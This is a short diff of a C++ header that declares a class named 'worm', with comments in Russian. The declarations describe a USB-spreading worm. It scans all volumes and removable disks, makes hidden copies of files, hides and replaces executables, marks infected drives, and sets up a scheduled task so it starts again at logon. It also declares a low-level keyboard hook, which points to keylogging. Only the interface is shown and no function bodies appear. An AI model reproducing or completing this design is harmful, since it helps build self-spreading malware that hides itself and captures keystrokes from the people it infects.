@@ -51,9 +51,8 @@ private:
 	int iteration;
 	vector <fs::path> exe_on_the_flash_drive;
 
-
-
 public:
+
 	worm(const wstring& path_to_start = get_own_folder(), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
 
@@ -67,9 +66,7 @@ public:
 
 	void worm_was_started();// Massage Box для отладки
 	void worm_was_end();
-
 	void scan_all_volumes();
-	
 	void search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp);// рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
 	void search_list_dir();// для старта поиска по дирректориям
 	void print_list_dir();// вывод всех найденных папок, в которых будет копирование
@@ -80,12 +77,12 @@ public:
 	void replicate_files(int iteration = 1);// создает скрытые копии из вектора поля file_to_copy в те же папки 
 	void copy_and_hide_worm();// чтобы добавить в таск менеджер, желательно перекопировать червя в какую-то безопасную папку
 	void create_scheduled_task(const wstring& worm_path); // создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )
-	
 	void process_all_removable_disks(); // проходимся по всем съемным носителям
 	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path);
-		
+	bool possible_to_write(const wstring& dir_path); // функция проверяет возможность создавать файлы в папке
 	bool infected_dir(const wstring& dir_path); // создаем файл, чтобы не заражать флкшку несколько раз
 	bool dir_was_infected(const wstring& dir_path); // проверка на заражение
+	bool is_system_path(const std::wstring& path); // проверка на системную папку
 
 	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 	static HHOOK keyboardHook;
